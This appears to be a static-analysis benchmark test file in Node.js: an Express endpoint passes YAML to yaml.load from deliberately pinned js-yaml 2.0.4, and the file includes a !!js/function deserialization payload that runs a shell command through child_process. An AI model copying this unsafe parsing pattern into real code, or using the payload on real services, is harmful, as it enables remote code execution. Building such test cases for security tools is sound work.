const express = require('express')
const yaml = require('js-yaml') // npm install js-yaml@2.0.4
const app = express()
app.use(express.text())
app.post('/parse', (req, res) => {
  // SOURCE
  const userControlledYaml = req.body
  let bar = userControlledYaml;
  // here
  try {
    throw new Error();
  } catch (err) {
    bar = "safe: data";
    try {
      // SINK
      const parsedData = yaml.load(bar)
    const result = parsedData();
    res.json({ "result": result })
    } catch (err) {
      res.status(500).send('error')
    }
  }
})

app.listen(3000)

const maliciousYaml = `
!!js/function >
  function() {
    const process = global.require('child_process');
    process.execSync('calc.exe');
    return "Exploit succeeded";
  }
`